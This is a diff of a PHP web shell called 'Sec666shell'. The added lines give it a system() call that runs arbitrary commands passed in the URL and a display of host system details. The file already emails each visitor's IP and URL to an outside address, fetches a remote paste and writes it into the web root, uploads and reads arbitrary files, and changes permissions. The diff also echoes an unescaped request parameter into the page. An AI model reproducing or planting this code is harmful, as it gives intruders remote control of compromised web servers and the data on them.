@@ -1,10 +1,10 @@
 <?php
 ini_set('memory_limit', '64M');
 header('Content-Type: text/html; charset=UTF-8');
-$boss = 'zsec@gmx.com';
+$mailsec = 'zsec@gmx.com';
 $x_path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
 $ip = "akses : { $x_path } | IP Address : { " . $_SERVER['REMOTE_ADDR'] . " }";
-mail($boss, "Sec666shell", $ip, "{ " . $_SERVER['REMOTE_ADDR'] . " }");
+mail($mailsec, "Sec666shell", $ip, "{ " . $_SERVER['REMOTE_ADDR'] . " }");
 $check3=$_SERVER['DOCUMENT_ROOT'] . "/sec.html" ;
 $text3 = file_get_contents('https://ghostbin.co/paste/shjro/raw');
 $op3=fopen($check3, 'w');
@@ -26,6 +26,9 @@ echo '<!DOCTYPE HTML>
 <style>
 body{
 font-family: "Federant";
+background-image:url(https://i.ibb.co/DLXyr8B/20200308-072032.jpg);
+background-size:cover;
+background-position:center center;
 background-color: darkred;
 color:red;
 }
@@ -54,6 +57,7 @@ h1{ color: #000; text-decoration: none; border-radius:0px; border:0px;margin:0px
 <body>
 <center><br><h1 style="font-family: Calligraffitti;"><font color="white">Sec666shell</font></h1><center><br>
 <table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
+<tr><td><font color="white">Your IP : </font><font color="red">{ </font><font color="white">' . $_SERVER['REMOTE_ADDR'] . '</font><font color="red"> }</font></td></tr>
 <tr><td><font color="white">Directory  : </font>';
 if(isset($_GET['path'])){
 $path = $_GET['path'];
@@ -77,24 +81,30 @@ if($i != $id) echo "/";
 echo '">'.$pat.'</a>/';
 }
 echo '</td></tr><tr><td>';
-echo '<form enctype="multipart/form-data" method="POST">
-<font color="white">File Upload :</font> <input type="file" name="file" />
+echo '<font color="white">System : <font color="red">{ </font>' .php_uname(). '<font color="red"> }</font></font></td></tr>';
+echo'<tr><td><center><font color="white">{></font>'.$_GET['filesrc'].
+'<font color="white"><}</font></center></td></tr>';
+echo '<tr><td><center><form enctype="multipart/form-data" method="POST">
+<input type="file" name="file" />
 <input type="submit" value="upload" />
-</form>
-</td></tr>';
+</form></center></td></tr>';
 if(isset($_FILES['file'])){
 if(copy($_FILES['file']['tmp_name'],$path.'/'.$_FILES['file']['name'])){
 echo '<font color="green">✓</font><font color="white"> Success Upload </font><font color="green">✓</font><br/>';
 }else{
-echo '<font color="red">×</font><font color="white"> Cannot Upload </font><font color="red">×</font><br><br/>';
+echo '<font color="red">×</font><font color="white"> Cannot Upload </font><font color="red">×</font><br/>';
 }
 }
+if(isset($_GET['cmd'])){
+echo '<textarea rows="10" cols="85">';
+echo system($_GET['cmd']);
+echo '</textarea>';
+}
+echo '</table>';
 if(isset($_GET['filesrc'])){
-echo '<tr><td><font color="white">Current File : </font>'.$_GET['filesrc'].
-'</tr></td></table><br/>';
 echo('<pre>'.htmlspecialchars(file_get_contents($_GET['filesrc'])).'</pre>');
 }elseif(isset($_GET['option']) && $_POST['opt'] != 'delete'){
-echo '</table><br /><center>'.$_POST['path'].'<br/><br/>';
+echo '</table><br/><center>'.$_POST['path'].'<br/><br/>';
 if($_POST['opt'] == 'chmod'){
 if(isset($_POST['perm'])){
 if(chmod($_POST['path'],$_POST['perm'])){
